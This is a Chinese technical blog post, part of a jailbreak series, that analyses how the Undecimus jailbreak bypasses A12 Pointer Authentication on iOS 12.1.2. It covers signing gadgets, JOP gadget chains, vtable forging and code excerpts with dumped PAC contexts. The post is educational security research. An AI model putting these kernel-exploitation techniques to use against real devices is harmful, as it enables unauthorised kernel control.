---
title: Undecimus 分析（四）绕过 A12 的 PAC 实现 kexec
date: 2020-02-11 21:26:31
tags: ['JailBreak', 'Undecimus', 'PAC', 'KEXEC']
---

# 系列文章
1. [iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying](https://juejin.im/post/5dd10660e51d453fac0a598d)
2. [iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address](https://juejin.im/post/5dd918d051882573180a2ba7)
3. [iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying](https://juejin.im/post/5de37a236fb9a071b5615dea)
4. [iOS Jailbreak Principles - Sock Port 漏洞解析（四）The tfp0 !](https://juejin.im/post/5dec7f2f6fb9a0160c411516)
5. [iOS Jailbreak Principles - Undecimus 分析（一）Escape from Sandbox](https://juejin.im/post/5df5f6416fb9a016402d1cc0)
6. [iOS Jailbreak Principles - Undecimus 分析（二）通过 String XREF 定位内核数据](https://juejin.im/post/5e087dbd51882549757e5be2)
7. [iOS Jailbreak Principles - Undecimus 分析（三）通过 IOTrap 实现内核任意代码执行](https://juejin.im/post/5e1ac76d51882520c02c82c0)

# 前言
在 [上一篇文章](https://juejin.im/post/5e1ac76d51882520c02c82c0) 中我们介绍了非 arm64e 下通过 IOTrap 实现 kexec 的过程。阻碍 arm64e 实现这一过程的主要因素是 PAC (Pointer Authentication Code) 缓解措施，在这一篇文章中我们将介绍 Undecimus 中绕过 PAC 机制的过程。

整个绕过过程十分复杂，本文的主要参考资料为 [Examining Pointer Authentication on the iPhone XS](https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html) 和 Undecimus 中与 arm64e 相关的 PAC Bypass 代码。

# PAC 的一些特点
什么是 PAC 这里不再赘述，简言之就是一种对返回地址、全局指针等的一种签名与验签保护机制，详细定义和机制读者可以自行查阅资料，这里仅给出一个简单的例子来帮助理解 PAC 实现。

下面这段代码中包含了一个全局数值变量、一个基于函数指针 fptr 的动态函数调用，猜一下哪些值会被 PAC 保护呢？
```c++
// pac.cpp
#include <cstdio>

int g_somedata = 102;

int tram_one(int t) {
    printf("call tramp one %d\n", t);
    return 0;
}

void step_ptr(void *ptr) {
    *reinterpret_cast<void **>(ptr) = (void *)&tram_one;
}

int main(int argc, char **argv) {
    g_somedata += argc;
    void *fptr = NULL;
    step_ptr(fptr);
    (reinterpret_cast<int (*)(int)>(fptr))(g_somedata);
    return 0;
}
```

下面我们用 clang 将 cpp 编译链接并生成 arm64e 下的汇编代码：
```bash
clang -S -arch arm64e -isysroot `xcrun --sdk iphoneos --show-sdk-path` -fno-asynchronous-unwind-tables pac.cpp -o pace.s
```

生成的完整汇编结果为：
```arm
	.section	__TEXT,__text,regular,pure_instructions
	.build_version ios, 13, 0	sdk_version 13, 0
	.globl	__Z8tram_onei           ; -- Begin function _Z8tram_onei
	.p2align	2
__Z8tram_onei:                          ; @_Z8tram_onei
	.cfi_startproc
; %bb.0:
	pacibsp
	sub	sp, sp, #32             ; =32
	stp	x29, x30, [sp, #16]     ; 16-byte Folded Spill
	add	x29, sp, #16            ; =16
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	stur	w0, [x29, #-4]
	ldur	w0, [x29, #-4]
                                        ; implicit-def: $x1
	mov	x1, x0
	mov	x8, sp
	str	x1, [x8]
	adrp	x0, l_.str@PAGE
	add	x0, x0, l_.str@PAGEOFF
	bl	_printf
	mov	w9, #0
	str	w0, [sp, #8]            ; 4-byte Folded Spill
	mov	x0, x9
	ldp	x29, x30, [sp, #16]     ; 16-byte Folded Reload
	add	sp, sp, #32             ; =32
	retab
	.cfi_endproc
                                        ; -- End function
	.globl	__Z8step_ptrPv          ; -- Begin function _Z8step_ptrPv
	.p2align	2
__Z8step_ptrPv:                         ; @_Z8step_ptrPv
; %bb.0:
	sub	sp, sp, #16             ; =16
	adrp	x8, l__Z8tram_onei$auth_ptr$ia$0@PAGE
	ldr	x8, [x8, l__Z8tram_onei$auth_ptr$ia$0@PAGEOFF]
	str	x0, [sp, #8]
	ldr	x0, [sp, #8]
	str	x8, [x0]
	add	sp, sp, #16             ; =16
	ret
                                        ; -- End function
	.globl	_main                   ; -- Begin function main
	.p2align	2
_main:                                  ; @main
	.cfi_startproc
; %bb.0:
	pacibsp
	sub	sp, sp, #64             ; =64
	stp	x29, x30, [sp, #48]     ; 16-byte Folded Spill
	add	x29, sp, #48            ; =48
	.cfi_def_cfa w29, 16
	.cfi_offset w30, -8
	.cfi_offset w29, -16
	adrp	x8, _g_somedata@PAGE
	add	x8, x8, _g_somedata@PAGEOFF
	stur	wzr, [x29, #-4]
	stur	w0, [x29, #-8]
	stur	x1, [x29, #-16]
	ldur	w0, [x29, #-8]
	ldr	w9, [x8]
	add	w9, w9, w0
	str	w9, [x8]
	mov	x8, #0
	str	x8, [sp, #24]
	ldr	x0, [sp, #24]
	bl	__Z8step_ptrPv
	adrp	x8, _g_somedata@PAGE
	add	x8, x8, _g_somedata@PAGEOFF
	ldr	x0, [sp, #24]
	ldr	w9, [x8]
	str	x0, [sp, #16]           ; 8-byte Folded Spill
	mov	x0, x9
	ldr	x8, [sp, #16]           ; 8-byte Folded Reload
	blraaz	x8
	mov	w9, #0
	str	w0, [sp, #12]           ; 4-byte Folded Spill
	mov	x0, x9
	ldp	x29, x30, [sp, #48]     ; 16-byte Folded Reload
	add	sp, sp, #64             ; =64
	retab
	.cfi_endproc
                                        ; -- End function
	.section	__DATA,__data
	.globl	_g_somedata             ; @g_somedata
	.p2align	2
_g_somedata:
	.long	102                     ; 0x66

	.section	__TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
	.asciz	"call tramp one %d\n"


	.section	__DATA,__auth_ptr
	.p2align	3
l__Z8tram_onei$auth_ptr$ia$0:
	.quad	__Z8tram_onei@AUTH(ia,0)

.subsections_via_symbols
```

## 返回地址保护
这里有几个值得注意的地方，第一个是每个嵌套了调用的函数的开头和结尾处都被插入了 PAC 指令：
```arm
__Z8tram_onei:
    pacibsp
    ; ...
    retab
```
这里 PAC 用 Instruction Key B 保护了函数的返回地址，有效防止了 JOP 攻击。

再看一下全局变量的声明和访问：
```arm
	.section	__DATA,__data
	.globl	_g_somedata             ; @g_somedata
	.p2align	2
_g_somedata:
	.long	102                     ; 0x66
	
	adrp	x8, _g_somedata@PAGE
	add	x8, x8, _g_somedata@PAGEOFF
	ldr	w9, [x8]
```
可见常规的数值变量并没有在 PAC 的保护之下。

## 指针保护
下面我们来看一下函数指针的赋值与调用：
```c++
int tram_one(int t) {
    printf("call tramp one %d\n", t);
    return 0;
}

void step_ptr(void *ptr) {
    *reinterpret_cast<void **>(ptr) = (void *)&tram_one;
}

int main(int argc, char **argv) {
    // ...
    void *fptr = NULL;
    step_ptr(fptr);
    (reinterpret_cast<int (*)(int)>(fptr))(g_somedata);
    return 0;
}
```

首先可以看到 tram_one 函数地址这一全局符号受到了 PAC 保护：
```arm
	.section	__DATA,__auth_ptr
	.p2align	3
l__Z8tram_onei$auth_ptr$ia$0:
	.quad	__Z8tram_onei@AUTH(ia,0)
```

`step_ptr` 函数中对应的访问代码：
```arm
__Z8step_ptrPv:
    ; ...
	adrp	x8, l__Z8tram_onei$auth_ptr$ia$0@PAGE
	ldr	x8, [x8, l__Z8tram_onei$auth_ptr$ia$0@PAGEOFF]
	; ...
```

在执行 `(reinterpret_cast<int (*)(int)>(fptr))(g_somedata);` 调用时，采用了带 PAC 验证的指令：
```arm
_main: 
    ; ...
    ; x8 = l__Z8tram_onei$auth_ptr$ia$0
    blraaz	x8
```

# PAC 对 JOP 的影响
在上一篇文章中我们实现 kexec 的关键在于劫持一个虚函数，这里所修改的地址有：
1. 修改虚函数表的 getTargetAndTrapForIndex 指针指向 Gadget；
2. 构造 IOTrap，其 func 指向要执行的内核函数。

不幸的是，这两个地址都受到了 PAC 机制的保护[1]，所以我们之前的 kexec 方法在 arm64e 上就失效了。以下的代码摘自于参考资料[1]：
```arm
loc_FFFFFFF00808FF00
    STR        XZR, [SP,#0x30+var_28]  ;; target = NULL
    LDR        X8, [X19]               ;; x19 = userClient, x8 = ->vtable
    ; 1. vtable is under protection
    AUTDZA     X8                      ;; validate vtable's PAC
    ; ...
    MOV        X0, X19                 ;; x0 = userClient
    ; 2. vtable->getTargetAndTrapForIndex is under protection
    BLRAA      X8, X9                  ;; PAC call ->getTargetAndTrapForIndex
    ; ...
    MOV        X9, #0                  ;; Use context 0 for non-virtual func
    B          loc_FFFFFFF00808FF70
    ; ...
loc_FFFFFFF00808FF70
   ; ... not set x9
   ; 3. trap->func is under protection
   BLRAA      X8, X9                  ;; PAC call func(target, p1, ..., p6)
   ; ...
```

由上面的代码可知，在 arm64e 架构的 iOS 12.1.2 内核代码中，虚函数表、虚函数指针和 IOTrap 的函数指针都得到了 PAC 保护。

**需要特别注意的是，这里的 trap->func 调用所使用的 context 寄存器 X9 被写入了 0，即 BLRAA 相当于验签了一个 PACIZA 签名的地址，这是实现第一个受限 kexec 的重要突破口。**

# 绕过 PAC 的理论分析
## 限制条件
在 参考资料[1] 的 write-up 中很大篇幅讲述了从软件白盒、硬件黑盒的角度对 PAC 进行的分析与绕过尝试，并得到了如下结论：
1. 储存 PAC Key 的寄存器只能在 EL1 模式下访问，而用户态处于 EL0，无法直接访问这些系统寄存器；
2. 即使我们能从内核的内存中读取到 PAC Key，如果不能逆向出完整的加解密过程，依然无法伪造签名；
3. Apple 在 EL0 和 EL1 中使用了不同的 PAC Key，这就打破了 Croess-EL PAC Forgeries；
4. Apple 在实现 PACIA, PACIB, PACDA 和 PACDB 这些指令时采用了不同的算法，即使全部使用相同的 Key 也会得到不同的结果，这就打破了 Cross-Key Symmetry；
5. 虽然在软件层面看 PAC Key 是 hardcode 的，但事实证明每次启动 PAC Key 都会变化。

这 5 条限制每一条都刺痛着尝试绕过 PAC 的人们的心，可见苹果在这一方面做了非常多变态的保护企图将 JOP 彻底解决。此外苹果还在公开的 XNU 代码中删除了与 PAC 相关的细节，并通过控制流混淆等手段阻止黑客在 kernelcache 中轻易找到可用的 Signing Gadgets。

## 有利条件
不得不佩服这些内核大佬的功力，即使在如此重重保护下 Brandon Azad 依然找到了 PAC 在实现上的一些软件漏洞：
1. PAC 在进行验签时，如果发现验签失败，它会将 2 位 error code 插入到指针的 62~61 区域，这里是 pointer's extension bits；
2. PAC 在执行签名时，如果发现指针的 extension bits 异常，它仍然会插入正确的签名，只是会通过翻转 PAC 的最高位 (第 62 位) 来使指针失效。

有趣的事情来了，如果我们把一个常规的地址交给 PAC 验签 (`AUT*`)，那么它会给指针的 extension bits 插入一个 error code 使其异常。此后如果再将这个值进行签名 (`PAC*`)，由于 error code 的存在会签名失败，但是正确的 PAC 依然会被计算并插入，只是指针的第 62 位被翻转了。因此我们只要找到一个先对指针的值进行 `AUT*`，随后再进行 `PAC*` 最后将值写入固定内存的代码片段即可作为 Signing Gadget。

## PACIZA Signing Gadget
基于上面的理论，Brandon Azad 在 arm64e 的 kernelcache 中发现了一个满足上述有利条件的代码片段：
```c
void sysctl_unregister_oid(sysctl_oid *oidp)
{
   sysctl_oid *removed_oidp = NULL;
   sysctl_oid *old_oidp = NULL;
   BOOL have_old_oidp;
   void **handler_field;
   void *handler;
   uint64_t context;
   ...
   if ( !(oidp->oid_kind & 0x400000) )         // Don't enter this if
   {
       ...
   }
   if ( oidp->oid_version != 1 )               // Don't enter this if
   {
       ...
   }
   sysctl_oid *first_sibling = oidp->oid_parent->first;
   if ( first_sibling == oidp )                // Enter this if
   {
       removed_oidp = NULL;
       old_oidp = oidp;
       oidp->oid_parent->first = old_oidp->oid_link;
       have_old_oidp = 1;
   }
   else
   {
       ...
   }
   handler_field = &old_oidp->oid_handler;
   handler = old_oidp->oid_handler;
   if ( removed_oidp || !handler )             // Take the else
   {
       ...
   }
   else
   {
       removed_oidp = NULL;
       context = (0x14EF << 48) | ((uint64_t)handler_field & 0xFFFFFFFFFFFF);
       *handler_field = ptrauth_sign_unauthenticated(
               ptrauth_auth_function(handler, ptrauth_key_asia, &context),
               ptrauth_key_asia,
               0);
       ...
   }
   ...
}
```
可以看到在代码的最底部有一个 unauth 与 auth 的嵌套调用，先对 handler 执行 auth 即 `AUT*`，随后立即执行 unauth，即 `PAC*`，正好满足了 Signing Gadget 条件。另外一个重要条件是签名结果必须写入稳定的内存，使得我们能够轻易、稳定地读取到。这里写入的 `handler_field` 指向 `old_oidp->oid_handler`，继续分析可知它来自于函数入参的 `oidp`。

### 寻找 Gadget
下一步的关键就是如何触发 `sysctl_unregister_oid` 并控制 `oidp` 的值。幸运的是 `sysctl_oid` 是被 `global sysctl tree` 所持有的，用于向内核中注册参数。虽然没有任何直接指向 `sysctl_unregister_oid` 的指针，但许多 kext 在启动时会通过 sysctl 注册参数，在结束时会通过 `sysctl_unregister_oid` 实现反注册，这是一个重要的线索。

最终 Brandon Azad 在 `com.apple.nke.lttp` 这一 kext 中找到了一对函数 `l2tp_domain_module_stop` 和 `l2tp_domain_module_start`，调用前者时会传递一个全局变量 `sysctl__net_ppp_l2tp` 来实现反注册，调用后者可以重新启动模块，并且这对函数包含可被定位的引用，该引用是通过 Instruction Key A 无 Context 签名的。

还记得文章开头提到的非虚函数地址在进行 `IOTrap->func` 调用时也是通过 Instruction Key A 和无 Context 进行验签的。因此我们只需要通过 XREF 技术定位到函数地址和全局变量地址，即可通过修改 `sysctl__net_ppp_l2tp` 来篡改 `old_oidp->oid_handler`，接下来只要找到调用 `l2tp_domain_module_stop` 的方法就可以实现对任意地址的 PACIZA 签名了。

### 触发 Gadget
似乎找到 `l2tp_domain_module_stop` 和找到一个 kexec 一样困难，但事实上它比一个完整的 kexec 简单的多，这是因为 `l2tp_domain_module_stop` 是无参的。我们依然可以尝试利用 IOTrap，但这一次我们无法劫持虚函数，因此需要找到一个已存在的包含 IOTrap 调用的对象。

所幸 Brandon Azad 在 kernelcache 中找到了一个 IOAudio2DeviceUserClient 类，它默认实现了 getTargetAndTrapForIndex 并提供了一个 IOTrap：
```c
IOExternalTrap *IOAudio2DeviceUserClient::getTargetAndTrapForIndex(
       IOAudio2DeviceUserClient *this, IOService **target, unsigned int index)
{
   ...
   *target = (IOService *)this;
   return &this->IOAudio2DeviceUserClient.traps[index];
}

IOAudio2DeviceUserClient::initializeExternalTrapTable() {
    // ...
    this->IOAudio2DeviceUserClient.trap_count = 1;
    this->IOAudio2DeviceUserClient.traps = IOMalloc(sizeof(IOExternalTrap));
    // ...
}
```
这里的 `getTargetAndTrapForIndex` 将 target 指定为自己，这使得 `trap->func` 调用的隐含参数无法修改，即通过这种方式无法传递 arg0，也就只能通过篡改 `trap->func` 实现无参函数或是代码块的调用。

基于上述讨论，整个 PACIZA Signing Gadget 的构造和调用过程如下：
1. 通过 IOKit 的 userland 接口启动一个 IOAudio2DeviceService，获取到 IOAudio2DeviceUserClient 的 `mach_port` 句柄；
2. 通过句柄找到其 `ipc_port`，其 `ip_kobject` 指针指向的是真正的 IOAudio2DeviceUserClient 对象。先记录下对象地址，随后在对象上找到 traps 地址，由于 IOAudio2DeviceUserClient 只声明了一个 trap，traps 的首地址即我们要修改的 IOTrap 的地址；
3. 通过 String XREF 技术定位 `l2tp_domain_module_start`, `l2tp_domain_module_stop` 和 `sysctl__net_ppp_l2tp` 的地址，先缓存原始的 `sysctl_oid`，随后构造 `sysctl_oid` 满足 `sysctl_unregister_oid` 特定的执行路径，最后将 `sysctl_oid->oid_handler` 赋值为需要签名的地址；
4. 修改第 2 步找到的 trap，将其 func 指向 `l2tp_domain_module_stop`，并通过 IOConnectTrap6 触发 IOAudio2DeviceUserClient 对象的 `IOTrap->func` 调用，这里便实现了对 `l2tp_domain_module_stop` 的调用，随后会执行到 `sysctl_unregister_oid`，并将签名失败的结果写入 `sysctl__net_ppp_l2tp->oid_handler`，此时我们可以读取结果，并翻转第 62 位得到正确的签名；
5. 最后一步是通过 `l2tp_domain_module_start` 重启服务，但这里需要传递新的 `sysctl_oid` 作为入参，通过上面的 Primitives 是无法完成的。

## 清理环境
由于 IOAudio2DeviceUserClient 的 IOTrap 调用仅能实现无参的 kexec，我们无法在完成 PACIZA 签名后重启 IOAudio2DeviceUserClient 服务，这会使得 Signing Gadget 失去幂等性，或是留下其他隐患，因此必须找到一个能有参调用 kexec 的办法来重启服务。

问题的关键是 `IOTrap->func` 调用时 arg0 指向了 this，因此单次调用时肯定无法修改 arg0 了，我们这里可以尝试多次跳转。所幸在 kernelcache 中有这样的一段代码：
```arm
MOV         X0, X4
BR          X5
```
由于我们通过 IOConnectTrap6 能控制 x1 ~ x6，所以通过 x4 既能间接控制 x0，x5 即是下一跳的地址，我们先让 `IOTrap->func` 指向这一片段的 PACIZA'd 地址，然后通过 x4 控制 arg0，x1 ~ x3 控制 arg1 ~ arg3，x5 控制 JOP 的目标地址，即可实现一个 4 个参数的 kexec。

因此我们只需要用上面的无参调用去签名一下上述代码块的地址，然后将其作为 `IOTrap->func` 的地址，再通过 IOConnectTrap6 的入参控制 x1 ~ x5 即可实现对 `l2tp_domain_module_start` 的带参调用，这里传递的是之前备份的 `sysctl_oid`，从而完美的恢复现场。

到这里，一个完美的 PACIZA Signing Gadget 就达成了，同时我们还得到了一个非常有用的代码片段的 PACIZA 签名：
```arm
MOV         X0, X4
BR          X5
```
我们将其称为 G1，也是这是后续工作的一个重要 Gadget。

## PACIA & PACDA Signing Gadget
遗憾的是许多调用点（例如虚函数）都采用了带有 Context 的调用方式，例如上文中提到的片段：
```c
context = (0x14EF << 48) | ((uint64_t)handler_field & 0xFFFFFFFFFFFF);
*handler_field = ptrauth_sign_unauthenticated(
       ptrauth_auth_function(handler, ptrauth_key_asia, &context),
       ptrauth_key_asia,
       0);
```

这就要求我们找到包含 PACIA 和 PACDA 的代码块，且他们要将签名结果写入稳定的内存。所幸这样的 Gadget 也是存在的：
```arm
; sub_FFFFFFF007B66C48
; ...
PACIA       X9, X10
STR         X9, [X2,#0x100]
; ...
PACDA       X9, X10
STR         X9, [X2,#0xF8]
; ...
PACIBSP
STP         X20, X19, [SP,#var_20]!
...         ;; Function body (mostly harmless)
LDP         X20, X19, [SP+0x20+var_20],#0x20
AUTIBSP
MOV         W0, #0
RET
```

这一段代码同时包含了 PACIA 和 PACDA，且后续都通过 STR 写入了内存。唯一不足的是在执行完语句后距离 RET 还有很远的距离，且当前入口点位于函数的中间位置。所幸函数真正的开场白位于这些指令之后：
```arm
PACIBSP
STP         X20, X19, [SP,#var_20]!
; ...
```

所以似乎我们从中部进入函数不会有太多的不良影响，在这里我们只需要控制 x9 作为指针，x10 作为 context，x2 控制写入的内存区域，即可实现一个 PACIA & PACDA 的签名伪造。

但是基于 IOAudio2DeviceUserClient 的 IOConnectTrap6 我们只能控制 x1 ~ x6，无法直接控制 x9 和 x10，这里就需要我们寻找更多的 Gadget 来实现组合调用来控制 x9 和 x10。

随后 Brandon Azad 在 kernelcache 中又搜索到了几个可利用的 Gadget，截止到目前我们总共有 3 个可用的 Gadget：
```arm
; G1
MOV         X0, X4
BR          X5

; G2
MOV         X9, X0
BR          X1

; G3
MOV         X10, X3
BR          X6
```

G1 使我们能通过 x4 控制 x0，再通过 G2 可将 x0 写入 x9，最后通过 G3 将 x3 写入 x10，G1 -> G2 通过 X5 指向 G2 实现，G2 - > G3 通过 X1 指向 G3 实现，最后通过 x6 即可跳转到包含 PACIA & PACDA 的 Gadget，此时 x2, x9, x10 均已间接填入合适的参数，因此可以完成一个 PACIA & PACDA Forgery。

上述调用环环相扣，且不能有任何寄存器上的重叠，否则将无法有效地准备参数，我们难以想象找到这么一组 Gadget 耗费了多么大的精力，在这里向大佬致敬。基于上述讨论，我们以 G1 为 `IOTrap->func` 的入口点，如下准备 IOConnectTrap6 的参数：
```c
trap->func = paciza(G1);
arg1 = x1 = G3;
arg2 = x2 = buffer_to_save_pacxad_pointer;
arg3 = x3 = context;
arg4 = x4 = pointer;
arg5 = x5 = G2;
arg6 = x6 = sub_FFFFFFF007B66C48_PACXA_ENTRY
```

这会形成一个链式调用，控制流如下：
```arm
MOV         X0, X4 
BR          X5  
MOV         X9, X0
BR          X1
MOV         X10, X3
BR          X6
PACIA       X9, X10
STR         X9, [X2,#0x100]
; ...
PACDA       X9, X10
STR         X9, [X2,#0xF8]
; ...
```

到这里我们就通过一系列的 Gadget 和 IOConnectTrap6 实现了 PACIA & PACDA 的 Forgery。

## 完美的 kexec
到这里我们已经可以伪造 Key A 的任意签名，但依然没有实现完美的 kexec，此时我们还只能实现 4 个参数的 kexec，其根本原因是我们依赖于 IOAudio2DeviceUserClient 对 getTargetAndTrapForIndex 的默认实现，遗憾的是这一实现中将 target 设置为了 this 从而导致我们无法直接控制 arg0，转向 Gadget 后则会遇到 4 个参数的限制：
```c
IOExternalTrap *IOAudio2DeviceUserClient::getTargetAndTrapForIndex(
       IOAudio2DeviceUserClient *this, IOService **target, unsigned int index)
{
   ...
   *target = (IOService *)this;
   return &this->IOAudio2DeviceUserClient.traps[index];
}
```
为了能实现完美的 kexec，最好的办法依然是劫持虚函数，虽然 PAC 对虚函数表和虚函数指针做了签名，但它是通过 Key A 完成的，到这里我们已经能够伪造这些签名，从而再次实现虚函数的劫持。

### 修改 getTargetAndTrapForIndex 为默认实现
IOAudio2DeviceUserClient 覆盖实现的 getTargetAndTrapForIndex 给我们带来了麻烦，这里我们可以将其修改为父类的默认实现：
```c
IOExternalTrap * IOUserClient::
getTargetAndTrapForIndex(IOService ** targetP, UInt32 index)
{
      IOExternalTrap *trap = getExternalTrapForIndex(index);

      if (trap) {
              *targetP = trap->object;
      }

      return trap;
}
```

由于 IOAudio2DeviceUserClient 的 traps 不是通过 getExternalTrapForIndex 取得的，这里我们还需要继续修改 getExternalTrapForIndex 方法，使其能够返回一个构造的 IOTrap，这里遇到的一个问题是父类默认实现为返回空值：
```c
IOExternalTrap * IOUserClient::
getExternalTrapForIndex(UInt32 index)
{
    return NULL;
}
```

这就需要我们在 IOUserClient 上找到一个合适的函数和成员变量，使得该函数返回成员变量或成员变量的某个引用，这样我们就能间接地通过控制成员变量来返回特定的 IOTrap。幸运的是 IOUserClient 间接继承了超类 IORegistryEntry，它包含了一个 reserved 成员和一个返回该成员的成员函数：
```c
class IORegistryEntry : public OSObject
{
// ...
protected:
/*! @var reserved
    Reserved for future use.  (Internal use only)  */
    ExpansionData * reserved;

public:
    uint64_t IORegistryEntry::getRegistryEntryID( void )
    {
        if (reserved)
    	return (reserved->fRegistryEntryID);
        else
    	return (0);
    }
```

可见我们只要将虚函数表中的 `getExternalTrapForIndex` 指向 `IORegistryEntry::getRegistryEntryID`，再修改 UserClient 实例的 reversed 使其 `reserved->fRegistryEntryID` 指向我们构造的 IOTrap 即可。

通过上述改造，我们再次获得了一个完美的支持 7 个入参的 kexec，**理论分析起来容易，要实施这一过程是十分复杂的，因为每一个虚函数所使用的 sign context 是不同的，这就要求 dump 出所有的 sign context 再进行处理**。

# 绕过 PAC 的代码导读
经过理论分析相信读者已经对整个绕过的过程有了整体认识，由于整个过程太过复杂，单单进行理论分析难免会让人云里雾里，将上述理论分析结合阅读 Undecimus 中的代码可以很好的加深理解。

这部分代码位于上一篇文章提到的 `init_kexec` 和 `kexec` 两个函数中，针对 arm64e 架构采用了完全不同的手段。**鉴于本文的理论分析部分已涉及到大量的代码，这里不再完整的进行分析，只说几个理论分析中未完全提及的内容**。完整的代码请读者结合上述理论分析自行阅读，相信你会有很大的收获。

经过上面的分析相信读者能够轻易地理解 `kernel_call_init` 中的 `stage1_kernel_call_init` 和 `stage2_kernel_call_init`，这两个阶段主要是完成 UserClient 的启动和 G1 的签名工作，需要注意的是在 `stage2_kernel_call_init->stage1_init_kernel_pacxa_forging` 的结尾处创建了一个 buffer，用来存储新的虚函数表以及 PACIA & PACDA 的签名结果：

```c
static void
stage1_init_kernel_pacxa_forging() {
    // ...
    kernel_pacxa_buffer = stage1_get_kernel_buffer();
}
```

此外 A12 在 iOS 12.1.2 的 PAC 机制也允许在 userland 通过 XPAC 指令直接将一个加签的指针还原，这给我们拷贝虚函数表带来了极大的便利，这段代码位于 `stage3_kernel_call_init` 中：
```c
uint64_t
kernel_xpacd(uint64_t pointer) {
#if __arm64e__
	return xpacd(pointer);
#else
	return pointer;
#endif
}

static uint64_t *
stage2_copyout_user_client_vtable() {
	// Get the address of the vtable.
	original_vtable = kernel_read64(user_client);
	uint64_t original_vtable_xpac = kernel_xpacd(original_vtable);
	// Read the contents of the vtable to local buffer.
	uint64_t *vtable_contents = malloc(max_vtable_size);
	assert(vtable_contents != NULL);
	kernel_read(original_vtable_xpac, vtable_contents, max_vtable_size);
	return vtable_contents;
}
```

在 patch 虚函数表时，每个函数都有其特定的 context，因此这里使用了 dump 出来的对应于每个虚函数的 PAC Code，这段代码位于 `stage2_patch_user_client_vtable` 中：
```c
static size_t
stage2_patch_user_client_vtable(uint64_t *vtable) {
// ...
#if __arm64e__
	assert(count < VTABLE_PAC_CODES(IOAudio2DeviceUserClient).count);
	vmethod = kernel_xpaci(vmethod);
	uint64_t vmethod_address = kernel_buffer + count * sizeof(*vtable);
	vtable[count] = kernel_forge_pacia_with_type(vmethod, vmethod_address,
			VTABLE_PAC_CODES(IOAudio2DeviceUserClient).codes[count]);
#endif // __arm64e__
	}
	return count;
}
```
这里针对每个虚函数都采用了不同的 PAC Code，dump 出的 PAC Code 通过静态变量存储，并借助宏 `VTABLE_PAC_CODES` 进行访问，这里的每个 context 长度只有 16 位：
```c
static void
pac__iphone11_8__16C50() {
    INIT_VTABLE_PAC_CODES(IOAudio2DeviceUserClient,
    	0x3771, 0x56b7, 0xbaa2, 0x3607, 0x2e4a, 0x3a87, 0x89a9, 0xfffc,
    	0xfc74, 0x5635, 0xbe60, 0x32e5, 0x4a6a, 0xedc5, 0x5c68, 0x6a10,
    	0x7a2a, 0xaf75, 0x137e, 0x0655, 0x43aa, 0x12e9, 0x4578, 0x4275,
    	0xff53, 0x1814, 0x122e, 0x13f6, 0x1d35, 0xacb1, 0x7eb0, 0x1262,
    	0x82eb, 0x164e, 0x37a5, 0xb659, 0x6c51, 0xa20f, 0xb3b6, 0x6bcb,
    	0x5a20, 0x5062, 0x00d7, 0x7c85, 0x8a26, 0x3539, 0x688b, 0x1e60,
    	0x1955, 0x0689, 0xc256, 0xa383, 0xf021, 0x1f0a, 0xb4bb, 0x8ffc,
    	0xb5b9, 0x8764, 0x5d96, 0x80d9, 0x0c9c, 0x5d0a, 0xcbcc, 0x617d
    	// ...
    );
}
```

其他部分基本在理论分析中都已提到，这里不再赘述。

# 总结
本文介绍了 PAC 缓解措施的特点以及 iOS 12.1.2 在 A12 上的绕过方法，整个过程可以说是让人叹为观止。通过研究整个 bypass 过程不仅让我们对 PAC 机制有了更深刻的认识，也学到了许多 JOP 的骚操作。

<img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img>

# 参考资料
1. [Brandon Azad, Project Zero. Examining Pointer Authentication on the iPhone XS](https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html) 
2. [pwn20wndstuff. Undecimus](https://github.com/pwn20wndstuff/Undecimus/blob/9d7a1076a2b088b25677f4a53822a3c396b1b837/Undecimus/source/jailbreak.m)